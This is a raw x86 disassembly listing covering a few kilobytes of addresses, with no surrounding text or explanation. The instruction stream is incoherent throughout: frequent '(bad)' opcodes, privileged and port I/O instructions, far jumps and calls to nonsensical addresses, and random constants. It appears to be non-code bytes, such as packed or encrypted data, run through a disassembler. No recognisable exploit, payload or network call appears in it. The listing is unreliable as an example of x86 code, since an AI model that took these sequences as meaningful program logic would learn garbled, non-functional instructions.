  4140ef:	jbe    0x414158
  4140f1:	bound  eax,QWORD PTR ds:[ebx]
  4140f4:	js     0x414134
  4140f6:	fprem1 
  4140f8:	pop    ss
  4140f9:	stos   BYTE PTR es:[edi],al
  4140fa:	lods   al,BYTE PTR ds:[esi]
  4140fb:	pop    ecx
  4140fc:	pop    ebp
  4140fd:	xchg   ebx,eax
  4140fe:	mov    bh,0xe1
  414100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414101:	jb     0x4140b3
  414103:	lods   eax,DWORD PTR ds:[esi]
  414104:	xchg   DWORD PTR [ecx+0x79],edx
  414107:	rol    DWORD PTR [eax],0x70
  41410a:	or     DWORD PTR [edx+ebp*2-0x1a],ebp
  41410e:	add    ebp,DWORD PTR [ebp-0x48]
  414111:	xlat   BYTE PTR ds:[ebx]
  414112:	pop    esp
  414113:	cmp    ebx,DWORD PTR [ebp-0x60a856d0]
  414119:	xchg   ecx,eax
  41411a:	repnz cmc 
  41411c:	jo     0x414109
  41411e:	je     0x41412c
  414120:	retf   0xfd2d
  414123:	inc    edx
  414124:	fidiv  WORD PTR [edx-0x7d]
  414127:	rol    DWORD PTR [ebp+0x7a5d970f],cl
  41412d:	cmp    ebx,ebx
  41412f:	sub    al,0x76
  414131:	or     edx,edx
  414133:	fist   DWORD PTR [edi-0x7acf2aeb]
  414139:	ins    BYTE PTR es:[edi],dx
  41413a:	sbb    ebp,DWORD PTR [ebx-0x69]
  41413d:	cmp    al,0x5e
  41413f:	(bad)  
  414140:	jmp    DWORD PTR [eax-0x2c454379]
  414146:	sar    eax,cl
  414148:	xor    ecx,edx
  41414a:	je     0x4141bf
  41414c:	sub    eax,0x58c1f5b4
  414151:	enter  0xaf19,0x28
  414155:	les    eax,FWORD PTR [eax]
  414157:	add    bl,BYTE PTR [eax+0x4a50352e]
  41415d:	and    ch,bl
  41415f:	stos   DWORD PTR es:[edi],eax
  414160:	mov    eax,esp
  414162:	fdiv   QWORD PTR [ebp+0x34]
  414165:	xor    BYTE PTR [ebx-0x6],al
  414168:	cli    
  414169:	data16 mov al,ds:0xececbca7
  41416f:	or     bh,BYTE PTR [edx]
  414171:	sar    BYTE PTR [eax],cl
  414173:	rcr    BYTE PTR [ebp+0x16],0x8a
  414177:	mov    BYTE PTR [ecx+0x27],al
  41417a:	addr16 push eax
  41417c:	xchg   ebx,eax
  41417d:	mov    ebp,esi
  41417f:	call   FWORD PTR [eax-0x36187092]
  414185:	(bad)  
  414186:	in     al,dx
  414187:	shl    DWORD PTR [edx],0xb3
  41418a:	pop    edi
  41418b:	push   cs
  41418c:	lahf   
  41418d:	push   ss
  41418e:	sub    DWORD PTR [ecx],eax
  414190:	inc    ebx
  414191:	je     0x414127
  414193:	cmp    eax,DWORD PTR [edi+0x101d9b41]
  414199:	pop    eax
  41419a:	pop    ss
  41419b:	and    BYTE PTR [esi+0x5d],dl
  41419e:	dec    esp
  41419f:	push   esp
  4141a0:	mov    dh,0x19
  4141a2:	(bad)  
  4141a3:	in     al,0x9d
  4141a5:	int    0xc7
  4141a7:	and    BYTE PTR [edi+0x45],ch
  4141aa:	xlat   BYTE PTR ds:[ebx]
  4141ab:	jmp    0x4141e8
  4141ad:	sbb    dl,cl
  4141af:	ins    BYTE PTR es:[edi],dx
  4141b0:	adc    ecx,DWORD PTR [ebp-0x6e]
  4141b3:	test   DWORD PTR [ecx-0x62],eax
  4141b6:	adc    DWORD PTR [esi+0x54],esi
  4141b9:	xchg   BYTE PTR [eax+0x7b],al
  4141bc:	ret    
  4141bd:	cli    
  4141be:	jmp    0x1ccc3e51
  4141c3:	dec    ebx
  4141c4:	mov    cl,0xe6
  4141c6:	ins    BYTE PTR es:[edi],dx
  4141c7:	jmp    0xcc1a3e93
  4141cc:	(bad)  
  4141cd:	js     0x41415b
  4141cf:	aam    0x33
  4141d1:	add    BYTE PTR [esi-0x32],bl
  4141d4:	inc    ecx
  4141d5:	add    dh,BYTE PTR [ebx-0x69]
  4141d8:	adc    edx,DWORD PTR [edi]
  4141da:	test   DWORD PTR [ebx],esi
  4141dc:	mov    bl,0xdf
  4141de:	(bad)
  4141e1:	add    DWORD PTR [esp+edi*2],0x165c6b0
  4141e8:	push   ecx
  4141e9:	push   ebp
  4141ea:	adc    BYTE PTR [edi],dh
  4141ec:	jmp    0x6aea:0x504efea
  4141f3:	or     al,0xef
  4141f5:	daa    
  4141f6:	adc    al,0x39
  4141f8:	mov    al,0x3b
  4141fa:	or     ch,ch
  4141fc:	pop    edi
  4141fd:	mov    WORD PTR [edx+ecx*8],fs
  414200:	mov    cl,0xf2
  414202:	pusha  
  414203:	call   0x91358ba4
  414208:	inc    edi
  414209:	dec    esi
  41420a:	lods   eax,DWORD PTR ds:[esi]
  41420b:	stos   WORD PTR es:[edi],ax
  41420d:	xchg   esi,eax
  41420e:	test   eax,0xfe424d9
  414213:	daa    
  414214:	adc    eax,0x234de550
  414219:	xchg   edx,eax
  41421a:	push   ss
  41421b:	(bad)  
  41421c:	and    eax,DWORD PTR [edx-0x45]
  41421f:	jmp    0x8738d934
  414224:	das    
  414225:	jb     0x414267
  414227:	inc    edi
  414228:	(bad)  
  414229:	(bad)  
  41422a:	icebp  
  41422b:	imul   esp,ecx,0x88e1583e
  414231:	xor    ch,ah
  414233:	lods   eax,DWORD PTR ds:[esi]
  414234:	push   ds
  414235:	or     DWORD PTR [ebx-0x20],eax
  414238:	jno    0x4141eb
  41423a:	jo     0x414254
  41423c:	aad    0x89
  41423e:	call   0x1b8b5158
  414243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414244:	adc    ah,BYTE PTR [ecx+ecx*2+0x42]
  414248:	jmp    0x1683:0x984a3019
  41424f:	or     BYTE PTR [edx+edx*2],dl
  414252:	test   eax,0x9d0f257a
  414257:	jge    0x414281
  414259:	scas   al,BYTE PTR es:[edi]
  41425a:	cmp    al,0x1b
  41425c:	xor    cl,BYTE PTR [esi+0x23]
  41425f:	cmp    al,0x6e
  414261:	cmp    edx,DWORD PTR [ecx]
  414263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414264:	push   edx
  414265:	aaa    
  414266:	pop    esp
  414267:	ds into 
  414269:	jns    0x4142d9
  41426b:	mov    cl,0xfe
  41426d:	xor    ecx,DWORD PTR [edi+0x64433db3]
  414273:	sar    DWORD PTR [edi-0x512523b3],cl
  414279:	enter  0x1ae6,0xa0
  41427d:	dec    esp
  41427e:	cmc    
  41427f:	gs cld 
  414281:	inc    ebp
  414282:	shr    BYTE PTR [edx],1
  414284:	sub    DWORD PTR [ecx],ebp
  414286:	mov    eax,0xbb3353d1
  41428b:	mov    bl,BYTE PTR [edx-0x583bda]
  414291:	aaa    
  414292:	xchg   edi,eax
  414293:	loope  0x414215
  414295:	dec    ebp
  414296:	inc    edx
  414297:	mov    ds:0x3b00aa6,eax
  41429c:	jo     0x414284
  41429e:	inc    eax
  41429f:	jmp    0xa216:0x3b1e9e40
  4142a6:	xlat   BYTE PTR ds:[ebx]
  4142a7:	push   ebx
  4142a8:	pop    es
  4142a9:	ret    0xc5a7
  4142ac:	sub    BYTE PTR [edi+0x775321c0],al
  4142b2:	fmul   QWORD PTR [ecx-0x46]
  4142b5:	push   ss
  4142b6:	xor    eax,0xa1332094
  4142bb:	jecxz  0x41427c
  4142bd:	mov    ecx,edx
  4142bf:	fwait
  4142c0:	je     0x4142ad
  4142c2:	adc    cl,BYTE PTR [eax]
  4142c4:	sbb    bh,BYTE PTR [edi-0x1cda85e6]
  4142ca:	fwait
  4142cb:	or     esi,ecx
  4142cd:	into   
  4142ce:	sbb    ebx,DWORD PTR [eax-0x68]
  4142d1:	jl     0x414348
  4142d3:	popa   
  4142d4:	mov    dl,0xbf
  4142d6:	xor    ebp,eax
  4142d8:	dec    edx
  4142d9:	cmc    
  4142da:	js     0x414356
  4142dc:	jge    0x4142e1
  4142de:	(bad)  
  4142df:	sahf   
  4142e0:	scas   al,BYTE PTR es:[edi]
  4142e1:	inc    esi
  4142e2:	fwait
  4142e3:	sbb    al,0x16
  4142e5:	mov    edx,0x1586ed76
  4142ea:	mov    dl,0xe
  4142ec:	sub    ecx,DWORD PTR [edx+0x25]
  4142ef:	lahf   
  4142f0:	pop    eax
  4142f1:	jmp    0xaf179469
  4142f6:	cmp    DWORD PTR [esp+esi*4-0x145f1ada],ebp
  4142fd:	dec    edi
  4142fe:	mov    ch,0x7d
  414300:	or     al,0xf5
  414302:	out    0xad,al
  414304:	dec    ecx
  414305:	out    0x8c,al
  414307:	sbb    ah,BYTE PTR [eax-0x3e6723ff]
  41430d:	fcomp  DWORD PTR [edi-0x7c]
  414310:	and    DWORD PTR [eax-0x651a6254],ebp
  414316:	lea    edi,[esp+ecx*1-0x234ae80a]
  41431d:	enter  0x45e8,0xee
  414321:	test   BYTE PTR [edi-0x69fc3ada],al
  414327:	ror    BYTE PTR [esi],1
  414329:	cwde   
  41432a:	inc    esp
  41432b:	or     ebp,esi
  41432d:	test   eax,0xb5928082
  414332:	sub    DWORD PTR [edx-0x38],esi
  414335:	cmp    bl,BYTE PTR [ebx]
  414337:	loope  0x41431e
  414339:	into   
  41433a:	push   ds
  41433b:	mov    eax,0xe78c2ea4
  414340:	in     eax,0xe8
  414342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414343:	sbb    esp,DWORD PTR [esi-0x1ac6beb8]
  414349:	test   al,0x66
  41434b:	(bad)  
  41434c:	push   ebx
  41434d:	loopne 0x41430d
  41434f:	clc    
  414350:	fcmovnb st,st(3)
  414352:	fistp  DWORD PTR [esi+0x5da6e864]
  414358:	jecxz  0x4143d7
  41435a:	push   0x9d55850e
  41435f:	clc    
  414360:	rcl    DWORD PTR [eax],1
  414362:	or     al,dl
  414364:	push   edi
  414365:	mov    bl,0x67
  414367:	push   ebx
  414368:	loop   0x41430c
  41436a:	xor    ch,BYTE PTR [edi+ebp*4]
  41436d:	in     al,0xcf
  41436f:	adc    BYTE PTR [ecx+ebp*2-0x6bfb7b96],al
  414376:	sbb    BYTE PTR [ecx-0x30],dl
  414379:	push   edi
  41437a:	jge    0x4143af
  41437c:	pop    es
  41437d:	xlat   BYTE PTR ds:[ebx]
  41437e:	mov    edi,0x6537c123
  414383:	out    dx,al
  414384:	sar    DWORD PTR [ebx],1
  414386:	rcr    ebx,cl
  414388:	cmp    ecx,DWORD PTR [ebx+eiz*2+0x6b69207c]
  41438f:	add    eax,0x7c3e315
  414394:	fild   WORD PTR [ebx+0x7c07a044]
  41439a:	std    
  41439b:	shl    DWORD PTR [edx+0x734bfdcc],1
  4143a1:	ret    0x6fdb
  4143a4:	cdq    
  4143a5:	add    DWORD PTR [esi+ebx*2-0x334e74fa],esp
  4143ac:	scas   eax,DWORD PTR es:[edi]
  4143ad:	and    esi,DWORD PTR [ebp+0x47]
  4143b0:	or     BYTE PTR [ebp+0x61],0xd1
  4143b4:	inc    eax
  4143b5:	clc    
  4143b6:	and    DWORD PTR ds:0xcaec90e,esp
  4143bc:	mov    edi,0x1ab92828
  4143c1:	(bad)  
  4143c2:	int3   
  4143c3:	inc    esi
  4143c4:	push   edi
  4143c5:	jl     0x4143ed
  4143c7:	aas    
  4143c8:	xor    al,0x1
  4143ca:	adc    ch,BYTE PTR [ebx-0x6172401f]
  4143d0:	xor    ch,dh
  4143d2:	sub    bh,BYTE PTR [edx-0x5d]
  4143d5:	nop
  4143d6:	sub    BYTE PTR [edi],ah
  4143d8:	call   0xf236aa59
  4143dd:	lods   al,BYTE PTR ds:[esi]
  4143de:	daa    
  4143df:	and    dh,BYTE PTR [ebx-0x5c]
  4143e2:	sub    ecx,DWORD PTR [eax+edi*4-0x1c]
  4143e6:	mov    esi,0xdf2bded5
  4143eb:	mov    dh,0xd8
  4143ed:	les    edx,FWORD PTR [edx]
  4143ef:	ja     0x4143c7
  4143f1:	inc    esp
  4143f2:	and    BYTE PTR [ecx+0x329c0383],ah
  4143f8:	push   ss
  4143f9:	xchg   ecx,eax
  4143fa:	stos   BYTE PTR es:[edi],al
  4143fb:	pop    esi
  4143fc:	xchg   edx,eax
  4143fd:	push   es
  4143fe:	lds    ecx,FWORD PTR [ebx+0x50]
  414401:	sbb    al,0x71
  414403:	mov    eax,0x523ffa51
  414408:	adc    al,0x2b
  41440a:	in     al,0xe7
  41440c:	add    edx,DWORD PTR [ecx-0x68]
  41440f:	jo     0x41444f
  414411:	lock cmp al,0x98
  414414:	js     0x41447f
  414416:	in     al,dx
  414417:	xor    esi,esi
  414419:	dec    esi
  41441a:	xchg   ecx,eax
  41441b:	test   al,0x56
  41441d:	je     0x414481
  41441f:	repz xor eax,0x8ad9d63b
  414425:	or     DWORD PTR [edx-0x13],ebp
  414428:	aaa    
  414429:	jg     0x41444d
  41442b:	repz lahf 
  41442d:	jecxz  0x414437
  41442f:	mov    bl,0xf6
  414431:	fisttp DWORD PTR [ecx-0x47]
  414434:	aas    
  414435:	mov    esi,0x6ddfa489
  41443a:	jg     0x4144a5
  41443c:	xor    bh,ch
  41443e:	or     ebx,DWORD PTR [ebx]
  414440:	not    BYTE PTR [ebp-0x6d]
  414443:	(bad)  
  414444:	cmp    ebx,DWORD PTR [edx]
  414446:	dec    edi
  414447:	xchg   DWORD PTR [eax+ebp*1+0x227d45a0],esp
  41444e:	lock clc 
  414450:	call   0x10600f86
  414455:	nop
  414456:	dec    esp
  414457:	mov    al,ds:0x481db20
  41445c:	not    DWORD PTR [ebp-0x67]
  41445f:	add    bl,BYTE PTR [ecx+0x62]
  414462:	jge    0x41449d
  414464:	sbb    al,bl
  414466:	mov    ds:0xde7dd810,al
  41446b:	(bad)  [edi]
  41446d:	mov    ds:0x6397c361,eax
  414472:	mov    eax,0xd85de0af
  414477:	sub    al,BYTE PTR [bx]
  41447a:	sub    al,0xc0
  41447c:	add    bh,al
  41447e:	jae    0x414404
  414480:	pop    ecx
  414481:	mov    edi,0x2044fb7d
  414486:	aaa    
  414487:	jae    0x4144f9
  414489:	xchg   edi,eax
  41448a:	adc    al,0x7f
  41448c:	fs mov ebp,0x86042d32
  414492:	scas   al,BYTE PTR es:[edi]
  414493:	inc    edi
  414494:	(bad)  
  414495:	or     DWORD PTR [ebx],ecx
	...
  414513:	add    ah,ch
  414515:	ss ins BYTE PTR es:[edi],dx
  414517:	or     esi,edi
  414519:	pop    ebx
  41451a:	in     eax,dx
  41451b:	test   DWORD PTR [edi-0x26],0x84d79ed2
  414522:	pop    esp
  414523:	pop    ebp
  414524:	scas   eax,DWORD PTR es:[edi]
  414525:	jmp    0x414527
  414527:	add    BYTE PTR [ebx+0x7],ch
  41452a:	add    BYTE PTR [eax],al
  41452c:	mov    ecx,0x9b407abc
  414531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414532:	(bad)  
  414533:	pop    ebp
  414534:	ja     0x4144ed
  414536:	sub    eax,0x2a4d343d
  41453b:	dec    ebp
  41453c:	int    0x2f
  41453e:	or     eax,0x90ebf073
  414543:	fistp  WORD PTR [edx-0x1c]
  414546:	daa    
  414547:	and    al,0x1d
  414549:	call   0xf25a:0x67bc54fb
  414550:	xchg   ebp,eax
  414551:	popf   
  414552:	and    BYTE PTR [ebx-0x6f],ch
  414555:	sub    eax,0x48c09c94
  41455a:	out    0xb2,eax
  41455c:	in     al,dx
  41455d:	in     al,dx
  41455e:	or     edx,DWORD PTR [edi]
  414560:	aam    0xb5
  414562:	dec    ebp
  414563:	stos   BYTE PTR es:[edi],al
  414564:	or     dh,BYTE PTR [ebp-0x42]
  414567:	loopne 0x41454a
  414569:	jns    0x4145b0
  41456b:	imul   ebp,eax,0xffffffea
  41456e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41456f:	add    ah,BYTE PTR ss:[edx-0x6d]
  414573:	cmc    
  414574:	(bad)  
  414575:	mov    esp,0x6bc85b63
  41457a:	add    DWORD PTR [eax+0x13],edx
  41457d:	fist   DWORD PTR [ebp-0x180116df]
  414583:	push   ebp
  414584:	sbb    al,0x44
  414586:	xchg   esp,eax
  414587:	xor    ecx,DWORD PTR [ecx-0x2a7c24e1]
  41458d:	xor    al,ch
  41458f:	leave  
  414590:	icebp  
  414591:	and    cl,cl
  414593:	adc    DWORD PTR [ebp+0x2ae7245a],eax
  414599:	sub    eax,ebp
  41459b:	mov    esi,0xbb9583c6
  4145a0:	pop    es
  4145a1:	cmp    al,0xc2
  4145a3:	mov    al,ds:0xe11e9e0
  4145a8:	cmp    ch,BYTE PTR [edx-0x2f0e2946]
  4145ae:	push   ebx
  4145af:	js     0x4145b9
  4145b1:	xchg   BYTE PTR [edi-0x63d04ef3],ch
  4145b7:	pop    ax
  4145b9:	outs   dx,BYTE PTR ds:[esi]
  4145ba:	add    BYTE PTR [ecx],bh
  4145bc:	rcl    ebp,0xf4
  4145bf:	test   eax,0x50a944e1
  4145c4:	inc    edx
  4145c5:	mov    ecx,0x7a5c1eb6
  4145ca:	or     ebp,DWORD PTR [edx+0x54]
  4145cd:	jbe    0x414552
  4145cf:	into   
  4145d0:	jne    0x4145a8
  4145d2:	shl    BYTE PTR [eax+0x7852809],cl
  4145d8:	jae    0x4145c2
  4145da:	adc    al,0x2a
  4145dc:	(bad)  
  4145dd:	xor    BYTE PTR [edx],dh
  4145df:	adc    eax,0xe1aaf67f
  4145e4:	xchg   DWORD PTR [eax+0x65],esi
  4145e7:	push   cs
  4145e8:	das    
  4145e9:	and    eax,0x5f9808cb
  4145ee:	out    0x86,al
  4145f0:	adc    eax,0x4ebd10e7
  4145f5:	cli    
  4145f6:	jbe    0x41465a
  4145f8:	dec    ebp
  4145f9:	mov    esi,DWORD PTR [ebp-0x6576dd18]
  4145ff:	or     dh,ah
  414601:	cmp    bl,ah
  414603:	mov    BYTE PTR [ebx-0x1f46380b],bl
  414609:	mov    al,ds:0xa8d036ab
  41460e:	stc    
  41460f:	lods   al,BYTE PTR ds:[esi]
  414610:	out    0x30,eax
  414612:	push   ebx
  414613:	cmp    eax,edi
  414615:	fs xor al,0x3e
  414618:	ficomp DWORD PTR [ebx]
  41461a:	outs   dx,BYTE PTR ds:[esi]
  41461b:	scas   al,BYTE PTR es:[edi]
  41461c:	sahf   
  41461d:	das    
  41461e:	xchg   BYTE PTR [eax+esi*8+0x3a],ch
  414622:	adc    BYTE PTR [edx+ebp*8-0x13e28f24],ah
  414629:	(bad)  
  41462a:	stos   BYTE PTR es:[edi],al
  41462b:	add    ebp,esi
  41462d:	jne    0x414642
  41462f:	dec    ecx
  414630:	ret    0xce20
  414633:	adc    eax,DWORD PTR fs:[ebx+0x43d89e86]
  41463a:	in     al,dx
  41463b:	or     DWORD PTR [ebp+0x1559edea],ecx
  414641:	jb     0x414618
  414643:	rol    DWORD PTR [eax],0xc1
  414646:	in     eax,dx
  414647:	sbb    esp,ecx
  414649:	xchg   ebp,eax
  41464a:	loopne 0x41469c
  41464c:	cmp    esi,DWORD PTR [edx]
  41464e:	mov    es,WORD PTR [edi+edi*8-0x2db46959]
  414655:	pop    ecx
  414656:	jge    0x414607
  414658:	or     al,0x9
  41465a:	nop
  41465b:	popw   ss
  41465d:	cmp    eax,0x976a2c07
  414662:	std    
  414663:	aam    0xa4
  414665:	out    0xb0,eax
  414667:	dec    esi
  414668:	dec    ebp
  414669:	add    BYTE PTR [edi+0x1d],bh
  41466c:	push   0xf6b3888d
  414671:	mov    cl,0x85
  414673:	inc    ebp
  414674:	sub    eax,0x650475f2
  414679:	mov    dh,0xfd
  41467b:	nop
  41467c:	(bad)  
  41467d:	sbb    eax,0x34efee8b
  414682:	dec    ebx
  414683:	scas   al,BYTE PTR es:[edi]
  414684:	xor    BYTE PTR [esi+0x62],al
  414687:	test   ah,ch
  414689:	std    
  41468a:	outs   dx,DWORD PTR ds:[esi]
  41468b:	xchg   ecx,eax
  41468c:	imul   ecx,DWORD PTR [ecx-0x6ab54af9],0x50b7c69b
  414696:	xchg   BYTE PTR [edx+edi*1-0x1ff0049f],dh
  41469d:	cmc    
  41469e:	push   esp
  41469f:	fisubr DWORD PTR [eax-0x6de43919]
  4146a5:	inc    esp
  4146a6:	(bad)  
  4146a7:	es idiv ah
  4146aa:	rol    BYTE PTR [edi],0x1e
  4146ad:	(bad)  
  4146af:	pushf  
  4146b0:	in     al,dx
  4146b1:	stos   DWORD PTR es:[edi],eax
  4146b2:	ror    BYTE PTR [edi+0x4a],0x3c
  4146b6:	pop    esp
  4146b8:	outs   dx,DWORD PTR ds:[esi]
  4146b9:	jge    0x414678
  4146bb:	retf   0x52ad
  4146be:	lahf   
  4146bf:	int    0xe8
  4146c1:	int3   
  4146c2:	test   eax,0x11f664ec
  4146c7:	sbb    BYTE PTR [eax+0x78],bh
  4146ca:	dec    ebx
  4146cb:	push   esi
  4146cc:	data16 sub al,0xd
  4146cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146d0:	mov    ebx,0xb41d2022
  4146d5:	rcl    cl,1
  4146d7:	int    0x77
  4146d9:	jmp    0x6c39:0x9ffe33dd
  4146e0:	(bad)  
  4146e1:	jge    0x4146b9
  4146e3:	repz call 0x810b999
  4146e9:	sahf   
  4146ea:	(bad)  
  4146eb:	push   ss
  4146ec:	pop    esi
  4146ed:	jge    0x414731
  4146ef:	nop
  4146f0:	push   es
  4146f1:	or     ch,bl
  4146f3:	cld    
  4146f4:	mov    dh,0x40
  4146f6:	out    0x90,eax
  4146f8:	pop    ebx
  4146f9:	push   edi
  4146fa:	xor    BYTE PTR [edi],bh
  4146fc:	dec    esi
  4146fd:	mov    ds:0x65d7a6ef,al
  414702:	pop    esp
  414703:	jno    0x414744
  414705:	xchg   DWORD PTR [ebx],ecx
  414707:	add    eax,0x35c0fdc
  41470c:	jl     0x4146c5
  41470e:	inc    ebp
  41470f:	sbb    edx,DWORD PTR [ebx-0x282b8731]
  414715:	jl     0x41476c
  414717:	hlt    
  414718:	mov    al,bl
  41471a:	ds enter 0x237b,0xbe
  41471f:	cdq    
  414720:	mov    ebx,0x6ab2983b
  414725:	mov    ch,0x8a
  414727:	pop    eax
  414728:	test   BYTE PTR [ecx+ebp*2+0x293d967f],ah
  41472f:	push   eax
  414730:	xchg   ecx,eax
  414731:	fdiv   st,st(7)
  414733:	out    dx,eax
  414734:	mov    bh,0x82
  414736:	repz or edx,DWORD PTR [esi+0x742bd4bd]
  41473d:	dec    esp
  41473e:	and    edx,ecx
  414740:	retf   0xffc9
  414743:	pop    ecx
  414744:	jmp    0xed3f7deb
  414749:	adc    al,0x7f
  41474b:	sar    DWORD PTR [ebp+0x7cd3cdfb],0x17
  414752:	inc    edx
  414753:	mov    BYTE PTR [ecx],dh
  414755:	mov    eax,0x997cb8f7
  41475a:	pop    ebp
  41475b:	or     eax,0x8a98fdb8
  414760:	es (bad) 
  414762:	mov    bh,BYTE PTR [ecx]
  414764:	or     esp,DWORD PTR fs:[esi]
  414767:	inc    ebp
  414768:	sub    eax,0xabb4f939
  41476d:	ret    0xeca4
  414770:	jmp    0xa01d:0xca4d3475
  414777:	xor    al,0x48
  414779:	(bad)  
  41477a:	mov    ebp,0x557b38d9
  41477f:	imul   ecx,DWORD PTR [edi],0x2d802c81
  414785:	aam    0x5e
  414787:	mov    dh,0xb
  414789:	iret   
  41478a:	bt     esi,edi
  41478d:	mov    ds:0xb00684bf,eax
  414792:	pop    ds
  414793:	imul   ecx,DWORD PTR [ebx-0x3],0x8707d702
  41479a:	jmp    0x4147ef
  41479c:	sbb    BYTE PTR ds:0x4b823d,0x5e
  4147a3:	adc    BYTE PTR [edi-0x63],ah
  4147a6:	push   ebx
  4147a7:	ret    0x1b50
  4147aa:	and    al,0x57
  4147ac:	out    dx,al
  4147ad:	mov    bl,0x71
  4147af:	cmc    
  4147b0:	gs in  al,0x79
  4147b3:	gs cmc 
  4147b5:	add    cl,BYTE PTR [edx]
  4147b7:	pop    es
  4147b8:	jmp    0x414830
  4147ba:	stos   DWORD PTR es:[edi],eax
  4147bb:	ficom  DWORD PTR [esi+0x7c0545b7]
  4147c1:	sbb    eax,0xbc29e9c
  4147c6:	xchg   esi,eax
  4147c7:	lods   al,BYTE PTR ds:[esi]
  4147c8:	fldln2 
  4147ca:	outs   dx,DWORD PTR ds:[esi]
  4147cb:	ret    0xfccb
  4147ce:	or     BYTE PTR [ecx+ecx*2-0x63],ch
  4147d2:	mov    edi,0xcc460fd7
  4147d7:	mov    esp,0xb6e79b87
  4147dc:	mov    edi,gs
  4147de:	push   edi
  4147df:	dec    esp
  4147e0:	imul   ecx,eax,0x6685ec98
  4147e6:	(bad)  
  4147e7:	xchg   esi,eax
  4147e8:	dec    edx
  4147e9:	daa    
  4147ea:	mov    esi,0x35aa5ebe
  4147ef:	into   
  4147f0:	and    eax,0x179508e0
  4147f5:	push   es
  4147f6:	lods   eax,DWORD PTR ds:[esi]
  4147f7:	and    edx,eax
  4147f9:	add    BYTE PTR [ebx],bh
  4147fb:	push   0xb243b94b
  414800:	test   BYTE PTR [ebp+0x4c18aadf],ah
  414806:	add    ah,BYTE PTR [eax+0x55f9abf]
  41480c:	add    BYTE PTR ss:[ebx-0x24],dh
  414810:	int3   
  414811:	adc    DWORD PTR [eax],ecx
  414813:	cmp    ebp,ebp
  414815:	sub    ah,BYTE PTR [eax+0x39]
  414818:	mov    eax,ds:0x5a23c71a
  41481d:	sub    BYTE PTR [edx+0x47],bh
  414820:	or     DWORD PTR [ebx+ebx*4-0x3fe5a73d],edi
  414827:	shl    BYTE PTR [edi-0x7b],cl
  41482a:	jmp    0xa50e:0xcb9507f5
  414831:	lock ins BYTE PTR es:[edi],dx
  414833:	sbb    esi,esp
  414835:	(bad)  
  414836:	or     dh,BYTE PTR [edx+eiz*2]
  414839:	repz pop ds
  41483b:	leave  
  41483c:	out    0x31,eax
  41483e:	xchg   ecx,eax
  41483f:	cmp    ah,0x94
  414842:	xlat   BYTE PTR ds:[ebx]
  414843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414844:	(bad)  [eax+0x2e0ac507]
  41484a:	mov    esi,0x83e71560
  41484f:	mov    dh,0x7d
  414851:	dec    eax
  414852:	in     al,dx
  414853:	pushf  
  414854:	cmp    edx,DWORD PTR [ebp-0x5d933c7b]
  41485a:	outs   dx,DWORD PTR ds:[esi]
  41485b:	ficom  WORD PTR [ebp-0x4c6a8f45]
  414861:	adc    BYTE PTR [eax],bh
  414863:	add    esp,esi
  414865:	cmp    ebp,0xffffffec
  414868:	push   0xffffffa6
  41486a:	mov    ch,al
  41486c:	add    ah,ch
  41486e:	add    esi,DWORD PTR [ebx+0x2775d27b]
  414874:	(bad)  
  414876:	adc    al,BYTE PTR [esi+0x53ded361]
  41487c:	and    al,BYTE PTR [edx+0x32]
  41487f:	xchg   ebp,eax
  414880:	push   esp
  414881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414882:	xor    BYTE PTR [ebx-0x2c73a911],0x94
  414889:	lods   eax,DWORD PTR ds:[esi]
  41488a:	dec    ebp
  41488b:	ret    
  41488c:	imul   esi,esp,0xef75a3a9
  414892:	ss pop es
  414894:	cmp    BYTE PTR [ebx],ch
  414896:	aaa    
  414897:	push   ecx
  414898:	jns    0x41485a
  41489a:	in     eax,0x8f
  41489c:	fistp  DWORD PTR [ecx]
  41489e:	outs   dx,BYTE PTR ds:[esi]
  41489f:	pusha  
  4148a0:	pop    ebp
  4148a1:	sti    
  4148a2:	call   DWORD PTR [ebx-0x21]
  4148a5:	mov    dh,0x63
  4148a7:	jns    0x414843
  4148a9:	jae    0x414861
  4148ab:	xchg   ecx,eax
  4148ac:	lods   eax,DWORD PTR ds:[esi]
  4148ad:	mov    bl,0xb4
  4148af:	dec    esp
  4148b0:	hlt    
  4148b1:	jno    0x4148e9
  4148b3:	xor    DWORD PTR ds:0x81986a67,esp
  4148b9:	test   al,0x8f
  4148bb:	inc    ebx
  4148bc:	jne    0x414848
  4148be:	mov    dh,0xdb
  4148c0:	pop    edx
  4148c1:	loope  0x414909
  4148c3:	daa    
  4148c4:	sbb    ebp,0x86ed23e2
  4148ca:	mov    al,ds:0x89cf8717
  4148cf:	mov    eax,0xa0f30e13
  4148d4:	enter  0x63bd,0xe1
  4148d8:	xlat   BYTE PTR ds:[ebx]
  4148d9:	(bad)  
  4148db:	mov    ecx,0x458d1a3f
  4148e0:	xor    eax,0x947b647b
  4148e5:	js     0x41492e
  4148e7:	test   DWORD PTR [ebp+0x39bd4cee],esp
  4148ed:	cmp    eax,0xdcea3a17
  4148f2:	cmc    
  4148f3:	sbb    ebp,edi
  4148f5:	out    0xc0,eax
  4148f7:	mov    ebp,DWORD PTR [ecx]
  4148f9:	sbb    cl,BYTE PTR [esi+0x24f5335c]
  4148ff:	add    al,0x20
  414901:	fcom   QWORD PTR [edi+ebp*8]
  414904:	test   DWORD PTR [ebp-0x5583395f],esp
  41490a:	mov    esp,0xf9d5b8c
  41490f:	adc    eax,0x21f30b1e
  414914:	mov    ds:0x670bb930,al
  414919:	mov    cl,0x4d
  41491b:	inc    esp
  41491c:	pop    ss
  41491d:	fs jnp 0x414950
  414920:	mov    cx,0xd4b5
  414924:	test   DWORD PTR [edx],ebx
  414926:	xchg   DWORD PTR [ebx],esi
  414928:	inc    esi
  414929:	push   ss
  41492a:	sub    DWORD PTR [ecx+0x1fb3d165],0x665c58fe
  414934:	loopne 0x4148db
  414936:	ror    DWORD PTR [eax+0x17],cl
  414939:	retf   
  41493a:	imul   ecx,DWORD PTR [ebp-0x2b5b298d],0x61
  414941:	xor    edx,DWORD PTR [edi]
  414943:	jne    0x4149a8
  414945:	jo     0x41492b
  414947:	lahf   
  414948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
